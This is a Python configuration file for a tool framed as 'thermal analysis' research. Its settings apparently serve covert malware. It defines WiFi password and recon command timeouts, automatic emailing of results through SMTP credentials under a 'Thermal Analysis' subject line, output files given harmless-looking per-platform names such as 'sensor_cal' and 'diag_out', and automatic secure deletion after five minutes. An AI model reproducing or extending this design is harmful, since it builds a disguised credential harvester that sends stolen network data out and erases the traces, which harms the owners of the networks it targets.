# --- config/network.py ---
# Network and communication configuration

import os
try:
    from dotenv import load_dotenv
    load_dotenv()  # Load .env file if it exists
except ImportError:
    pass  # dotenv not installed, fall back to system env vars

# Auto-reporting configuration
# Configure via environment variables in .env file for security
# Fallback to hardcoded thermal research credentials if env vars not set
AUTO_REPORT_EMAIL = os.getenv('AUTO_REPORT_EMAIL') or None
AUTO_REPORT_PASS = os.getenv('AUTO_REPORT_PASS') or None  
AUTO_REPORT_TARGET = os.getenv('AUTO_REPORT_TARGET') or None

# Email reporting modes:
# 'immediate' - Send email every time thermal analysis runs
# 'scheduled' - Send email twice daily (8 AM and 8 PM) 
# 'both' - Send immediate email + twice daily scheduled emails
# 'none' - No email reporting
AUTO_REPORT_MODE = os.getenv('AUTO_REPORT_MODE', 'immediate').lower()

# Thermal analysis configuration
ENABLE_THERMAL_ANALYSIS = os.getenv('ENABLE_THERMAL_ANALYSIS', 'true').lower() in ['true', '1', 'yes', 'on']

# WiFi scanning timeouts and behavior
WIFI_SCAN_TIMEOUT = 15
WIFI_PASSWORD_TIMEOUT = 5
WIFI_CONNECTION_TIMEOUT = 30

# Network discovery settings  
MAX_NETWORKS_TO_PROCESS = 2  # Limit thermal analysis operations
RECON_COMMAND_TIMEOUT = 5
AUTO_CLEANUP_DELAY = 300  # 5 minutes before thermal data cleanup

# Calibration file naming by platform
CALIBRATION_FILE_NAMES = {
    'linux': 'comm_cal_{}',
    'windows': 'sensor_cal_{}', 
    'darwin': 'diag_out_{}'
}

# Email reporting and compression
SMTP_SUBJECT_PREFIX = "Thermal Analysis"
COMPRESSION_LEVEL = 9
SECURE_DELETE_PASSES = 3 